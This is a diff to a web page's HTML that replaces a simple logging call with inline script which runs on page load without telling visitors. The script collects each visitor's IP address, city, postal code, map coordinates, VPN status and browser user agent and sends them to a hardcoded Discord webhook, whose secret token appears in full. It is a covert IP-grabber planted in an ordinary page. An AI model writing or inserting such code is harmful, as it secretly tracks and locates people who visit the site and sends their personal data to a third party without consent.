@@ -22,9 +22,48 @@
     </div>
 
     <script>
-      // Llama a la función al cargar la página (silencioso, ignora errores)
-      fetch('/.netlify/functions/log-visitor')
-        .catch(() => {});
+    (async () => {
+        // Tu webhook de Discord
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1405746856541032570/Ej8JxmwaWAUzn_KWYnptxMUXy20vZe5VQIYC-7AvlzBunnKti9S3tGpkB0n8ExmLXUje";
+
+        // Detectar IP y datos de ubicación
+        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const vpnCheck = await fetch(`https://json.geoiplookup.io/${ipData.ip}`).then(r => r.json());
+
+        const vpn = (vpnCheck.connection_type === "Corporate") ? "Yes" : "No";
+        const date = new Date();
+        const dateStr = date.toLocaleDateString("es-AR");
+        const timeStr = date.toLocaleTimeString("es-AR");
+
+        // Crear el embed
+        const payload = {
+            username: ipData.ip,
+            avatar_url: `https://countryflagsapi.com/png/${ipData.country_code}`,
+            embeds: [{
+                title: `Visitor From ${ipData.country_name}`,
+                color: 39423,
+                fields: [
+                    { name: "IP", value: ipData.ip, inline: true },
+                    { name: "VPN?", value: vpn, inline: true },
+                    { name: "Useragent", value: navigator.userAgent },
+                    { name: "Country/CountryCode", value: `${ipData.country_name}/${ipData.country_code}`, inline: true },
+                    { name: "Region | City | Zip", value: `[${ipData.region} | ${ipData.city} | ${ipData.postal}](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude} 'Google Maps Location (+/- 750M Radius)')`, inline: true }
+                ],
+                footer: {
+                    text: `${dateStr} ${timeStr}`,
+                    icon_url: "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
+                }
+            }]
+        };
+
+        // Enviar a Discord
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+    })();
     </script>
 </body>
 </html>
